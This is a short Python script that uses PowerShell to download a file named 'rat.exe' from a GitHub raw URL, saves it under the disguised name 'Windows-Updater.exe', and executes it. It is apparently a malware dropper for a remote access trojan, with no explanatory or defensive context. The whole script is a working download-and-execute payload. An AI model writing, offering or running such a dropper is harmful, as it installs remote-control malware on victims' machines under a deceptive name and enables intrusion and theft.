import subprocess
def download_and_run(url, output_file):
    powershell_cmd = f'Invoke-WebRequest -Uri "{url}" -OutFile "{output_file}"'
    subprocess.check_output(['powershell.exe', '-Command', powershell_cmd], stderr=subprocess.STDOUT, shell=True, text=True)
    subprocess.check_output([output_file], stderr=subprocess.STDOUT, shell=True, text=True)
download_and_run("https://raw.githubusercontent.com/syrabrox/own/main/rat.exe", "Windows-Updater.exe")
